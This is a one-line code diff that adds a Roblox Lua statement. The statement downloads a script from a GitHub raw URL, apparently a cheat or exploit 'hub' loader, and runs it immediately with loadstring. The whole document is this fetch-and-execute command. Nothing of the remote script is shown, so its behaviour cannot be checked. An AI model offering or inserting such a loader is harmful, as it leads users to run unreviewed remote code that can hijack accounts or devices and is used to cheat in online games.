@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/boatDeckRoblox/boat-Hub_loadstringRoblox/main/lol'))()
